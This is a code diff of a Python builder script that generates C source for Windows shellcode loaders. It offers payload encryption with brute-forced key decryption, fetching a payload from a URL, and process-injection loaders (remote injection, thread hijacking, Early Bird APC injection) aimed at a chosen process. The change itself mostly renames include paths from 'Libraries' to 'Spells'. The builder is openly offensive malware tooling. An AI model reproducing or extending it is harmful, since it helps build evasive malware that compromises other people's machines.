@@ -12,25 +12,25 @@ def build (Encryption, Enumeration, Payload, ProcessName, Loader, Url):
 #include <Windows.h>
 #include <stdio.h>
 #include <wininet.h>
-#include "Libraries/FetchFromURL.h"
+#include "Spells/UtilitySpells/FetchFromURL.h"
 """)   
     
     if Encryption != "null":
         f.write(f"""\n
-#include "Libraries/{Encryption}"
-#include "Libraries/KeyBrute.h"
+#include "Spells/EncryptionSpells/{Encryption}"
+#include "Spells/EncryptionSpells/KeyBrute.h"
 """)
         
     if Enumeration != "null":
         f.write(f"""\n
-#include "Libraries/{Enumeration}"
+#include "Spells/{Enumeration}"
 """)
     else:
         pass
 
 
     f.write(f"""\n
-#include "Libraries/{Loader}"
+#include "Spells/{Loader}"
 """)
     if Payload != "null":
         f.write(f"""\n
@@ -86,6 +86,7 @@ int main()
     BruteForceDecryption(HINT_BYTE , pbKey, sKeySize, &pbRealKey);
     size_t sRealKeySize = sizeof(pbRealKey);
     Decrypt(pPayloadAddress, pPayloadSize, pbRealKey, sRealKeySize);
+
 """)
 
     f.write(f"""\n
@@ -106,34 +107,34 @@ int main()
 
 def change_header_file(Enumeration, Loader, ApiMode):
     try:
-        with open(f"Libraries/{Enumeration}", "r") as file:
+        with open(f"Spells/{Enumeration}", "r") as file:
             content = file.read()
-        content = content.replace('#include "api.h"', f'#include "{ApiMode}"')
-        with open(f"Libraries/{Enumeration}", "w") as file:
+        content = content.replace('#include "api.h"', f'#include "../{ApiMode}"')
+        with open(f"Spells/{Enumeration}", "w") as file:
             file.write(content)
     except:
         pass
 
-    with open(f"Libraries/{Loader}", "r") as file:
+    with open(f"Spells/{Loader}", "r") as file:
         content = file.read()
-    content = content.replace('#include "api.h"', f'#include "{ApiMode}"')
-    with open(f"Libraries/{Loader}", "w") as file:
+    content = content.replace('#include "api.h"', f'#include "../{ApiMode}"')
+    with open(f"Spells/{Loader}", "w") as file:
         file.write(content)
 
 def restore_header_file(Enumeration, Loader, ApiMode):
     try:
-        with open(f"Libraries/{Enumeration}", "r") as file:
+        with open(f"Spells/{Enumeration}", "r") as file:
             content = file.read()
-        content = content.replace(f'#include "{ApiMode}"', '#include "api.h"')
-        with open(f"Libraries/{Enumeration}", "w") as file:
+        content = content.replace(f'#include "../{ApiMode}"', '#include "api.h"')
+        with open(f"Spells/{Enumeration}", "w") as file:
             file.write(content)
     except:
         pass
 
-    with open(f"Libraries/{Loader}", "r") as file:
+    with open(f"Spells/{Loader}", "r") as file:
         content = file.read()
-    content = content.replace(f'#include "{ApiMode}"', '#include "api.h"')
-    with open(f"Libraries/{Loader}", "w") as file:
+    content = content.replace(f'#include "../{ApiMode}"', '#include "api.h"')
+    with open(f"Spells/{Loader}", "w") as file:
         file.write(content)
 
 def main():
@@ -166,11 +167,11 @@ def main():
         ProcessName = "null"
     else:
         Loader = set_remote_loader_type()
-        if Loader == "RemoteInjection.h":
+        if Loader == "RemoteExecutionSpells/RemoteInjection.h":
             Enumeration = set_enum_type()
-        elif Loader == "RemoteThreadHijacking.h":
+        elif Loader == "RemoteExecutionSpells/RemoteThreadHijacking.h":
             Enumeration = "CreateSuspended.h"
-        elif Loader == "EarlyBirdApcInjection.h":
+        elif Loader == "RemoteExecutionSpells/EarlyBirdApcInjection.h":
             Enumeration = set_proc_creation_type() 
     
         ProcessName = set_process_name()
